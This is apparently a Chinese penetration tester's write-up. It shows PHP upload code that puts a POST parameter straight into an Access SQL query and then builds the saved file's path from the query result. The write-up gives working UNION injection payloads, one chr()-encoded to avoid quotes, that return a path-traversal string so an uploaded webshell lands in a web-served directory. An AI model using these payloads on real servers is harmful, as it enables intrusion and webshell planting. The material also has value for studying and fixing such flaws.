## 结合Access注入漏洞利用上传

#### 漏洞说明
这是在测试过程中发现的漏洞，需要一丁点小技巧才可以变废为宝，这里记录下来  
具体代码：		

```
<?

//	检查是否有文件上传
$Error=$_FILES['uploadMe']['error'];
switch($Error){
	case 0:
		break;
	case 1:
		Echo   "上传的文件超过了 php.ini 中 upload_max_filesize 选项限制的值."; return;
	case 2:
		Echo   "上传文件的大小超过了 HTML 表单中 MAX_FILE_SIZE 选项指定的值。"; return;
	case 3:
		Echo   "文件只有部分被上传";return;
	case 4:
		Echo   "没有文件被上传"; return;
}

$conn=odbc_connect("FuckWho","","");	//	连接ACCESS数据库
$strSql = "SELECT DEVID,PHONE FROM VVINFO WHERE MID=".$_POST["ID"];	//	注入漏洞形成
$resID=odbc_exec($conn,$strSql);	//	执行SQL语句
if(list($R_DEV_ID, $R_MOBILE) = record($resID)){	// 给变量赋值
	//另外的插入数据库值的代码,这里直接删除
}
odbc_close($conn);	//	关闭连接

//	如果上传成功，则自动移动到目标路径中
move_uploaded_file($_FILES['uploadMe']['tmp_name'], "d:/MY/A/B/C/".$R_DEV_ID."_".$_FILES['uploadMe']['name']);	//	移动文件

echo "<br><br><br>已经上传至目录.<br><br><br><a href='upload.php'>继续上传</a>";

?>
```

上传文件名称以及上传位置为：  
`"d:/MY/A/B/C/".$R_DEV_ID."_".$_FILES['uploadMe']['name']`  
前面路径已经定死为`d:/MY/A/B/C/`，而且这个目录WEB是不能访问到的，一个专门放附件的目录  
`$R_DEV_ID."_".$_FILES['uploadMe']['name']`存储的文件名称  
`$_FILES['uploadMe']['name']`	完完整整原文件名，没有任何安全检查  
文件名中间多了个`_`符号  
`$R_DEV_ID`变量是前面从数据库中查询出来的数据  

#### 思路  
上传一个webshell跨目录到WEB目录即可直接GETWEBSHELL  

#### 过程  
1、寻找D盘下面能访问到的WEB目录（能够解析PHP）,比如`D:\8080\`  
2、使用ACCESS注入点，通过联合查询，控制数据库返回值`DEVID `也就是后面的变量`$R_DEV_ID `，使返回值为'./../../../../8080/'，在移动临时文件的时候，移动到指定的目录下去，文件便可以直接能够访问  
3、注入点不能带入单引号，所以需要把POC编码，比如使用chr方法转成字符  

构造注入点POC  
`-1 Union select chr(46)+chr(47)+chr(46)+chr(46)+chr(47)+chr(46)+chr(46)+chr(47)+chr(46)+chr(46)+chr(47)+chr(46)+chr(46)+chr(47)+chr(46)+chr(46)+chr(47)+chr(56)+chr(48)+chr(56)+chr(48)+chr(47),2 from user`

`-1 Union select './../../../../../8080/',2 from user`

#### 完结
上传成功后文件名为:`_filename.php`，存在路径`D:\8080\`下 
